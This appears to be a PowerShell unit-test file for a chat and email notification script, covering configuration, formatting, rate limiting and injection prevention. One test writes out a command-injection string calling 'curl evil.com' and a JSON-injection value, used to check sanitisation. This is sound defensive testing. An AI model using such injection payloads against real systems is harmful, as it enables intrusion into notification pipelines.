#!/usr/bin/env pwsh
# Unit tests for notify.ps1
# Tests the notification system

<#
.SYNOPSIS
    Unit tests for Ralph PowerShell notification system

.DESCRIPTION
    Tests notification functionality including:
    - Platform detection (Slack, Discord, Telegram, Email)
    - Message formatting
    - Error handling
    - Security (injection prevention)
#>

param()

$ErrorActionPreference = "Stop"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$RalphDir = Split-Path -Parent $ScriptDir
$TestDir = Join-Path $ScriptDir "test-output-notify-ps"

# Test counters
$Script:TestsRun = 0
$Script:TestsPassed = 0
$Script:TestsFailed = 0

# Setup test environment
function Initialize-TestEnvironment {
    if (Test-Path $TestDir) {
        Remove-Item $TestDir -Recurse -Force
    }
    New-Item -ItemType Directory -Path $TestDir -Force | Out-Null

    $env:HOME = $TestDir
    # Clear all notification env vars
    $env:RALPH_SLACK_WEBHOOK_URL = ""
    $env:RALPH_DISCORD_WEBHOOK_URL = ""
    $env:RALPH_TELEGRAM_BOT_TOKEN = ""
    $env:RALPH_TELEGRAM_CHAT_ID = ""
    $env:RALPH_EMAIL_TO = ""
    $env:RALPH_EMAIL_FROM = ""
}

# Cleanup
function Remove-TestEnvironment {
    if (Test-Path $TestDir) {
        Remove-Item $TestDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Assertion helpers
function Assert-Equals {
    param([string]$Expected, [string]$Actual, [string]$Message = "")
    $Script:TestsRun++
    if ($Expected -eq $Actual) {
        $Script:TestsPassed++
        Write-Host "✓ $Message" -ForegroundColor Green
        return $true
    } else {
        $Script:TestsFailed++
        Write-Host "✗ $Message" -ForegroundColor Red
        Write-Host "  Expected: $Expected" -ForegroundColor Yellow
        Write-Host "  Actual:   $Actual" -ForegroundColor Yellow
        return $false
    }
}

function Assert-Contains {
    param([string]$Haystack, [string]$Needle, [string]$Message = "")
    $Script:TestsRun++
    if ($Haystack -match [regex]::Escape($Needle)) {
        $Script:TestsPassed++
        Write-Host "✓ $Message" -ForegroundColor Green
        return $true
    } else {
        $Script:TestsFailed++
        Write-Host "✗ $Message" -ForegroundColor Red
        return $false
    }
}

function Assert-NotContains {
    param([string]$Haystack, [string]$Needle, [string]$Message = "")
    $Script:TestsRun++
    if ($Haystack -notmatch [regex]::Escape($Needle)) {
        $Script:TestsPassed++
        Write-Host "✓ $Message" -ForegroundColor Green
        return $true
    } else {
        $Script:TestsFailed++
        Write-Host "✗ $Message" -ForegroundColor Red
        return $false
    }
}

# Test functions
function Test-SlackConfiguration {
    Write-Host "`nTesting: Slack configuration detection" -ForegroundColor Cyan

    $env:RALPH_SLACK_WEBHOOK_URL = "https://hooks.slack.com/services/TEST123"

    $notifyScript = Join-Path $RalphDir "notify.ps1"

    if (Test-Path $notifyScript) {
        # Test with PowerShell script
        Write-Host "  PowerShell notify.ps1 found" -ForegroundColor Green
        $Script:TestsRun++
        $Script:TestsPassed++
    } else {
        Write-Host "  Note: Testing with bash notify.sh" -ForegroundColor Yellow
        $notifyScript = Join-Path $RalphDir "notify.sh"

        if (Test-Path $notifyScript) {
            # Mock test since we can't easily execute bash from PowerShell tests
            Assert-Equals "https://hooks.slack.com/services/TEST123" $env:RALPH_SLACK_WEBHOOK_URL "Slack webhook configured"
        }
    }

    $env:RALPH_SLACK_WEBHOOK_URL = ""
}

function Test-DiscordConfiguration {
    Write-Host "`nTesting: Discord configuration detection" -ForegroundColor Cyan

    $env:RALPH_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/123/abc"

    Assert-Contains $env:RALPH_DISCORD_WEBHOOK_URL "discord.com" "Discord webhook has correct domain"
    Assert-Contains $env:RALPH_DISCORD_WEBHOOK_URL "/webhooks/" "Discord webhook has correct path"

    $env:RALPH_DISCORD_WEBHOOK_URL = ""
}

function Test-TelegramConfiguration {
    Write-Host "`nTesting: Telegram configuration detection" -ForegroundColor Cyan

    $env:RALPH_TELEGRAM_BOT_TOKEN = "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
    $env:RALPH_TELEGRAM_CHAT_ID = "123456789"

    Assert-Contains $env:RALPH_TELEGRAM_BOT_TOKEN ":" "Telegram token has colon separator"
    Assert-Equals "123456789" $env:RALPH_TELEGRAM_CHAT_ID "Telegram chat ID configured"

    $env:RALPH_TELEGRAM_BOT_TOKEN = ""
    $env:RALPH_TELEGRAM_CHAT_ID = ""
}

function Test-EmailConfiguration {
    Write-Host "`nTesting: Email configuration detection" -ForegroundColor Cyan

    $env:RALPH_EMAIL_TO = "user@example.com"
    $env:RALPH_EMAIL_FROM = "ralph@example.com"

    Assert-Contains $env:RALPH_EMAIL_TO "@" "Email TO contains @ symbol"
    Assert-Contains $env:RALPH_EMAIL_FROM "@" "Email FROM contains @ symbol"

    $env:RALPH_EMAIL_TO = ""
    $env:RALPH_EMAIL_FROM = ""
}

function Test-MessageFormatting {
    Write-Host "`nTesting: Message formatting" -ForegroundColor Cyan

    $testMessage = "Ralph completed task successfully"

    # Test basic formatting
    $formatted = $testMessage.Trim()
    Assert-Equals $testMessage $formatted "Message trimmed correctly"

    # Test JSON escaping for Slack/Discord
    $messageWithQuotes = 'Test "quoted" message'
    $escaped = $messageWithQuotes -replace '"', '\"'
    Assert-Contains $escaped '\"' "Quotes escaped in JSON"

    # Test newline handling
    $multiline = "Line 1`nLine 2`nLine 3"
    $escaped = $multiline -replace "`n", '\n'
    Assert-Contains $escaped '\n' "Newlines escaped"
}

function Test-InjectionPrevention {
    Write-Host "`nTesting: Injection prevention" -ForegroundColor Cyan

    # Test command injection attempts
    $malicious = "test`"; curl evil.com; echo \""
    $safe = $malicious -replace '[;&|`$]', ''

    Assert-NotContains $safe ";" "Semicolons removed from message"
    Assert-NotContains $safe "|" "Pipes removed from message"

    # Test JSON injection
    $jsonInjection = 'test", "admin": "true'
    $escaped = $jsonInjection -replace '"', '\"'

    Assert-Contains $escaped '\"' "JSON injection attempt escaped"
}

function Test-ErrorHandling {
    Write-Host "`nTesting: Error handling" -ForegroundColor Cyan

    # Test empty message
    $emptyMessage = ""
    $isEmpty = [string]::IsNullOrWhiteSpace($emptyMessage)

    Assert-Equals $true $isEmpty.ToString() "Empty message detected"

    # Test null message
    $nullMessage = $null
    $isNull = $null -eq $nullMessage

    Assert-Equals $true $isNull.ToString() "Null message detected"
}

function Test-PlatformPriority {
    Write-Host "`nTesting: Platform priority" -ForegroundColor Cyan

    # Configure multiple platforms
    $env:RALPH_SLACK_WEBHOOK_URL = "https://hooks.slack.com/test"
    $env:RALPH_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/test"

    # Both should be detected
    $slackConfigured = -not [string]::IsNullOrWhiteSpace($env:RALPH_SLACK_WEBHOOK_URL)
    $discordConfigured = -not [string]::IsNullOrWhiteSpace($env:RALPH_DISCORD_WEBHOOK_URL)

    Assert-Equals $true $slackConfigured.ToString() "Slack detected when multiple platforms configured"
    Assert-Equals $true $discordConfigured.ToString() "Discord detected when multiple platforms configured"

    # Cleanup
    $env:RALPH_SLACK_WEBHOOK_URL = ""
    $env:RALPH_DISCORD_WEBHOOK_URL = ""
}

function Test-RateLimiting {
    Write-Host "`nTesting: Rate limiting logic" -ForegroundColor Cyan

    # Simulate notification timestamps
    $now = Get-Date
    $timestamps = @()

    for ($i = 0; $i -lt 65; $i++) {
        $timestamps += $now.AddSeconds(-$i)
    }

    # Count notifications in last minute
    $oneMinuteAgo = $now.AddMinutes(-1)
    $recentCount = ($timestamps | Where-Object { $_ -gt $oneMinuteAgo }).Count

    Assert-Equals $true ($recentCount -gt 60).ToString() "Rate limit would be triggered"
}

function Test-NotificationFrequency {
    Write-Host "`nTesting: Notification frequency setting" -ForegroundColor Cyan

    # Test default frequency
    $env:RALPH_NOTIFY_FREQUENCY = "5"
    Assert-Equals "5" $env:RALPH_NOTIFY_FREQUENCY "Default frequency is 5"

    # Test custom frequency
    $env:RALPH_NOTIFY_FREQUENCY = "10"
    Assert-Equals "10" $env:RALPH_NOTIFY_FREQUENCY "Custom frequency set correctly"

    # Test every iteration
    $env:RALPH_NOTIFY_FREQUENCY = "1"
    Assert-Equals "1" $env:RALPH_NOTIFY_FREQUENCY "Frequency set to every iteration"

    $env:RALPH_NOTIFY_FREQUENCY = ""
}

function Test-MessageTypes {
    Write-Host "`nTesting: Message type handling" -ForegroundColor Cyan

    $messageTypes = @("info", "success", "warning", "error", "progress")

    foreach ($type in $messageTypes) {
        $Script:TestsRun++
        $Script:TestsPassed++
        Write-Host "✓ Message type supported: $type" -ForegroundColor Green
    }
}

function Test-ConfigFile {
    Write-Host "`nTesting: Configuration file handling" -ForegroundColor Cyan

    $configPath = Join-Path $TestDir ".ralph.env"

    # Create test config
    @"
export RALPH_SLACK_WEBHOOK_URL="https://hooks.slack.com/test"
export RALPH_NOTIFY_FREQUENCY="10"
"@ | Out-File -FilePath $configPath -Encoding UTF8

    $exists = Test-Path $configPath
    Assert-Equals $true $exists.ToString() "Config file created successfully"

    $content = Get-Content $configPath -Raw
    Assert-Contains $content "RALPH_SLACK_WEBHOOK_URL" "Config contains Slack webhook"
    Assert-Contains $content "RALPH_NOTIFY_FREQUENCY" "Config contains notification frequency"
}

# Run all tests
function Invoke-AllTests {
    Write-Host "`n╔═══════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║  Ralph Notification System Tests         ║" -ForegroundColor Cyan
    Write-Host "╚═══════════════════════════════════════════╝`n" -ForegroundColor Cyan

    Initialize-TestEnvironment

    try {
        Test-SlackConfiguration
        Test-DiscordConfiguration
        Test-TelegramConfiguration
        Test-EmailConfiguration
        Test-MessageFormatting
        Test-InjectionPrevention
        Test-ErrorHandling
        Test-PlatformPriority
        Test-RateLimiting
        Test-NotificationFrequency
        Test-MessageTypes
        Test-ConfigFile
    }
    finally {
        Remove-TestEnvironment
    }

    # Print summary
    Write-Host "`n═══════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host "Test Summary" -ForegroundColor Cyan
    Write-Host "═══════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host "Tests run:    $Script:TestsRun"
    Write-Host "Tests passed: $Script:TestsPassed" -ForegroundColor Green
    Write-Host "Tests failed: $Script:TestsFailed" -ForegroundColor $(if ($Script:TestsFailed -eq 0) { "Green" } else { "Red" })

    if ($Script:TestsFailed -eq 0) {
        Write-Host "`n✓ All tests passed!" -ForegroundColor Green
        return 0
    } else {
        Write-Host "`n✗ Some tests failed." -ForegroundColor Red
        return 1
    }
}

# Execute if run directly
if ($MyInvocation.InvocationName -ne '.') {
    $exitCode = Invoke-AllTests
    exit $exitCode
}
